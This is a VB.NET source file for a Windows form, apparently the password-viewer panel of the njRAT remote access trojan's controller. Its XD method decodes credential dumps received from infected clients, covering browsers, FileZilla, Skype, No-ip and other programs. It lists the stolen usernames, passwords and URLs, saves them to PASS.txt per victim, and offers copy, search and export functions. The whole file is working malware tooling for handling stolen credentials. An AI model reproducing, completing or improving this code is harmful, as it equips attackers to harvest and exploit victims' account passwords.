Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Pass
    Inherits Form
    ' Methods
    Public Sub New()
        Me.bool_0 = True
        Me.InitializeComponent()
    End Sub
    Public Sub FxCOLM(ByVal L1 As ListView)
        Dim num2 As Integer = (L1.Columns.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            L1.Columns.Item(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
            i += 1
        Loop
    End Sub

    Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InClipboardToolStripMenuItem.Click
        Try
            Dim text As String = Me.SV
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
                Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InDiskToolStripMenuItem.Click
        Try
            If (Me.SaveFileDialog1.ShowDialog = DialogResult.OK) Then
                File.WriteAllText(Me.SaveFileDialog1.FileName, Me.SV)
                Interaction.MsgBox(Me.SaveFileDialog1.FileName, MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception

        End Try
    End Sub



    Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FindToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Search", String.Empty, String.Empty, -1, -1)
            If (str <> String.Empty) Then
                Dim enumerator As IEnumerator
                Dim pass As New Pass With { _
                    .Name = "e", _
                    .Text = ("Search For '" & str & "'") _
                }
                pass.Show()
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim num As Integer = 0
                        Do
                            If (Strings.InStr(current.SubItems.Item(num).Text.ToLower, str.ToLower, CompareMethod.Binary) > 0) Then
                                Dim item2 As ListViewItem = pass.L1.Items.Add(current.Text, current.ImageIndex)
                                Dim num3 As Integer = (current.SubItems.Count - 1)
                                Dim i As Integer = 1
                                Do While (i <= num3)
                                    item2.SubItems.Add(current.SubItems.Item(i).Text)
                                    i += 1
                                Loop
                                Continue Do
                            End If
                            num += 1
                        Loop While (num <= 2)
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
                pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
                Me.FxCOLM(pass.L1)
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub CopyUseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUseToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).Text)
            End If
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyPassToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyALLToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator
            Dim text As String = String.Empty
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    [text] = String.Concat(New String() {[text], "URL: ", current.SubItems.Item(2).Text, ChrW(13) & ChrW(10) & "USR: ", current.SubItems.Item(0).Text, ChrW(13) & ChrW(10) & "PWD: ", current.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)})
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveEmptyPWToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(1).Text = String.Empty) Then
                    current.Remove()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub
    Public Function SV() As String
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = String.Concat(New String() {str, "URL: ", current.SubItems.Item(2).Text, ChrW(13) & ChrW(10) & "USR: ", current.Text, ChrW(13) & ChrW(10) & "PWD: ", current.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)})
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Return str
    End Function

    Public Sub XD(ByRef c As Client, ByRef S As String)
        Dim strArray2 As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
        Dim imageIndex As Integer = -1
        If Not Directory.Exists(c.Folder) Then
            Directory.CreateDirectory(c.Folder)
        End If
        Dim strArray As String() = New String() {"FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer", "ooVoo", "DUC v3", "Skype"}
        Dim contents As String = String.Empty
        Dim str2 As String
        For Each str2 In strArray2
            Try
                If (str2.Length > 0) Then
                    If (str2 = "*") Then
                        imageIndex += 1
                    Else
                        If Not str2.Contains(":") Then
                            str2 = Class6.smethod_16(str2)
                        End If
                        Dim strArray3 As String() = Strings.Split(str2, ":", -1, CompareMethod.Binary)
                        If (strArray3.Length > 3) Then
                            strArray3 = Strings.Split(Strings.Replace(str2, (strArray3(0) & ":" & strArray3(1)), Class6.smethod_14((strArray3(0) & ":" & strArray3(1))), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
                        End If
                        Dim item As New ListViewItem
                        item = Me.L1.Items.Add(Class6.smethod_16(strArray3(1)), imageIndex)
                        item.SubItems.Add(Class6.smethod_16(strArray3(2)))
                        item.SubItems.Add(Class6.smethod_16(strArray3(0)))
                        item.SubItems.Add(strArray(imageIndex))
                        NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L))}, Nothing, Nothing, Nothing, True)
                        contents = (contents & "USR: " & item.Text & ChrW(13) & ChrW(10))
                        contents = (contents & "PWD: " & item.SubItems.Item(1).Text & ChrW(13) & ChrW(10))
                        contents = (contents & "URL: " & item.SubItems.Item(2).Text & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10))
                    End If
                End If
            Catch exception1 As Exception

            End Try
        Next
        Try
            File.WriteAllText((c.Folder & "PASS.txt"), contents)
        Catch exception3 As Exception

        End Try
        Me.FxCOLM(Me.L1)
        Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub


    ' Fields
    Private bool_0 As Boolean

    Private Sub L1_DoubleClick(sender As Object, e As EventArgs) Handles L1.DoubleClick
        Try
            Dim text As String = Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text
            If Not [text].Contains("://") Then
                [text] = ("http://" & [text])
            End If
            Process.Start([text])
        Catch exception1 As Exception

        End Try
    End Sub


    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Me.bool_0 = True
        Me.L1.BringToFront()
    End Sub

    Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopySiteToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text)
            End If
        Catch exception1 As Exception

        End Try
    End Sub
End Class